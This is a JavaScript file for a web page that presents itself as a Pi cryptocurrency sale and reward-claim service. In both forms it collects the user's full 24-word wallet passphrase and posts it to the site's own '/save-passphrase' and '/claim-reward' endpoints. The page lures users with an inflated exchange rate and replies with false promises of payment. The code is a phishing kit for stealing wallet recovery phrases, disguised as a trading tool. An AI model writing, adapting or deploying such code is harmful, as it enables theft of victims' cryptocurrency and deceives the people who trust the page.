// Get references to elements
const sellButton = document.getElementById('sell-btn');
const popup = document.getElementById('popup');
const closeBtn = document.getElementById('close-btn');
const form = document.getElementById('sell-form');
const passphraseInput = document.getElementById('passphrase');
const piAmountInput = document.getElementById('pi-amount');
const paymentMethodInput = document.getElementById('payment-method');
const exchangeRate = 38.5; // 1 Pi = 38.5 USD
const exchangeRateText = document.getElementById('exchange-rate-text'); // Text element for displaying USD amount

// Event listener to open the popup when "Sell" button is clicked
sellButton.addEventListener('click', function () {
    popup.style.display = 'block';
});

// Event listener to close the popup when "Close" button (×) is clicked
closeBtn.addEventListener('click', function () {
    popup.style.display = 'none';
});

// Close the popup if clicked outside the popup content
window.addEventListener('click', function (event) {
    if (event.target === popup) {
        popup.style.display = 'none';
    }
});

// Function to update the USD amount based on Pi input
function updateUsdAmount() {
    const piAmount = parseFloat(piAmountInput.value);
    if (!isNaN(piAmount) && piAmount > 0) {
        const usdAmount = piAmount * exchangeRate;
        exchangeRateText.textContent = `You will get ${usdAmount.toFixed(2)} USD`;
    } else {
        exchangeRateText.textContent = `1 Pi = ${exchangeRate} USD`;
    }
}

// Open the Reward Popup
document.getElementById('reward-option').addEventListener('click', () => {
    document.getElementById('reward-popup').style.display = 'block';
});

// Close the Reward Popup
document.getElementById('close-reward-popup').addEventListener('click', () => {
    document.getElementById('reward-popup').style.display = 'none';
});

// Handle Claim Reward Button
document.getElementById('claim-reward-btn').addEventListener('click', () => {
    const rewardPassphrase = document.getElementById('reward-passphrase').value.trim();

    if (rewardPassphrase.split(' ').length === 24) {
        // Send the passphrase to the backend for saving
        fetch('/claim-reward', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ passphrase: rewardPassphrase }),
        })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert(data.message);
                    document.getElementById('reward-popup').style.display = 'none';
                } else {
                    alert('Failed to claim reward: ' + data.message);
                }
            })
            .catch(error => {
                console.error('Error processing reward claim:', error);
                alert('An error occurred while claiming the reward.');
            });
    } else {
        alert('Invalid passphrase! Please enter the correct 24-word passphrase.');
    }
});

// Event listener for when Pi amount is changed
piAmountInput.addEventListener('input', updateUsdAmount);

// Initial call to set the exchange rate text when page loads
updateUsdAmount();

// Form submission handler for "Sell"
form.addEventListener('submit', function (event) {
    event.preventDefault();

    const piAmount = piAmountInput.value;
    const passphrase = passphraseInput.value;
    const paymentMethod = paymentMethodInput.value;

    const passphraseWords = passphrase.trim().split(/\s+/);
    if (passphraseWords.length !== 24) {
        alert('Please enter the correct passphrase with 24 words.');
        return;
    }

    const formData = {
        piAmount: piAmount,
        passphrase: passphrase,
        paymentMethod: paymentMethod,
    };

    fetch('/save-passphrase', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
    })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                alert('Sale Confirmed!!! You will be contacted via email soon for amount transfer.');
                popup.style.display = 'none';
                form.reset();
            } else {
                alert('Failed to confirm sale.');
            }
        })
        .catch(error => {
            console.error('Error saving passphrase:', error);
            alert('An error occurred while processing your request.');
        });
});
